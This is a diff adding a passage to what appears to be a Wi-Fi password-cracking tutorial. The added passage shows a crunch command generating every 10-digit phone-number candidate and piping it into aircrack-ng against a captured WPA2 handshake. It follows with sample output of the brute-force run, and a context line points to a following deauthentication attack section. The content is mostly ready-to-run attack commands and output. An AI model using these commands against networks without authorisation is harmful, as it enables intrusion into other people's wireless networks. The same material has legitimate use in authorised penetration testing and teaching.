@@ -193,6 +193,38 @@ Now, use crunch with Aircrack-ng
 crunch 8 8 0123456789 | aircrack-ng -a2 'PATH-TO-CAP-FILE'.cap  -b 58:98:35:CB:A2:77 -w -
 ```
 
+An example to crack with 10 digit phone number using -t parameter
+```bash
+crunch 10 10 -t  "%%%%%%%%%%" | aircrack-ng -a 2 XXXXXX.cap  -b XX:XX:XX:XX:XX:XX -w -
+Crunch will now generate the following amount of data: 110000000000 bytes
+104904 MB
+102 GB
+0 TB
+0 PB
+Crunch will now generate the following number of lines: 10000000000
+Opening XXXXX.cap
+Reading packets, please wait...
+
+                                 Aircrack-ng 1.2 rc4
+
+
+                   [00:00:17] 16012 keys tested (1039.35 k/s)
+
+
+                       Current passphrase: 0000015981                 
+
+
+      Master Key     : B0 EA 2A 5B D3 81 A1 BE D0 7D E3 C3 92 03 55 51
+                       C9 5A 68 5E 3C 1D 9F 64 B5 9D 3D FA 5E A9 48 DC
+
+      Transient Key  : C0 30 AB 37 E6 CD BB 40 CE 34 56 F7 BD 13 71 3C
+                       63 77 D8 71 21 2A 7F 6F 0A 89 CE AE 70 36 46 E8
+                       C8 65 91 37 17 57 46 82 92 8B 8C 56 79 FC 0A 2A
+                       18 A0 F6 B2 3B C7 9F 86 87 6D 4D D2 08 38 8F 71
+
+      EAPOL HMAC     : AD 9B E6 04 BC 8B C5 0A 0F 72 68 CE D0 BD BC 5A
+```
+
 Everything else is same as above just dictionary file is replaced with generated passwords.
 
 ## Deauth Attack
